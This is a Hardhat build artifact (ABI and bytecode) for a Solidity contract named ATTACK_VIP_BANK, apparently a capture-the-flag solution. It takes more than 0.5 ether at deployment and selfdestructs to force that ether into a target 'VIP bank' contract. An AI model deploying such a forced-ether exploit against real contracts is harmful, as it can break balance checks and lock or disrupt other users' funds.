{
  "_format": "hh-sol-artifact-1",
  "contractName": "ATTACK_VIP_BANK",
  "sourceName": "contracts/attackvipbank.sol",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "receivingfundsaddress",
          "type": "address"
        }
      ],
      "name": "destroy_vip_bank_contract",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526706f05b59d3b20000341161004e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610045906100b0565b60405180910390fd5b6100d0565b600082825260208201905092915050565b7f73656e64206d6f7265207468616e20302e3520657468657220706c6561736500600082015250565b600061009a601f83610053565b91506100a582610064565b602082019050919050565b600060208201905081810360008301526100c98161008d565b9050919050565b610118806100df6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063046a35ea14602d575b600080fd5b60436004803603810190603f919060ba565b6045565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000608c826063565b9050919050565b609a816083565b811460a457600080fd5b50565b60008135905060b4816093565b92915050565b60006020828403121560cd5760cc605e565b5b600060d98482850160a7565b9150509291505056fea26469706673582212207015ef67a7abaad310a5939c28a509acd1d7ed97c73176ff5b13eef73884569164736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}